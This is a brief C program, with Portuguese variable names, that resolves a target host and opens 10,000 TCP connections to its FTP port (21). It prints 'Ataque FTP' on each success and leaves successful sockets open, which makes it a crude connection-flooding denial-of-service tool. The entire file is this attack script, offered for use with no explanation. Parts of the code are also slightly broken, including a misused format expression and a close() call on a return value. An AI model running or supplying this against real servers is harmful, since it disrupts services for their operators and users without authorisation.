#include <stdio.h>
#include <netdb.h>
#include <arpa/inet.h>

int main (int argc, char *argv[])
	{
		int consocket;
		int conecta;

        int ataque;
	    
		int inicio =0;
		int final = 10000;
		char * destino;
		char * server;

        server = argv[1];
        struct hostent *host;
        host=gethostbyname(server);

        destino=("%s \n",inet_ntoa(*((struct in_addr *)host->h_addr)));

		struct sockaddr_in alvo;

		for(ataque=inicio;ataque<final;ataque++)
		{
		consocket = socket(AF_INET, SOCK_STREAM, 0);
		alvo.sin_family = AF_INET;
		alvo.sin_port = htons(21);
		alvo.sin_addr.s_addr = inet_addr(destino);

		conecta = connect(consocket, (struct sockaddr *)&alvo, sizeof alvo);

		if (conecta == 0)
		{
			printf("Ataque FTP em %s ==> %s \n",server,destino);
		} else {
			close(consocket);
			close(conecta);
			}
	
		}
	}
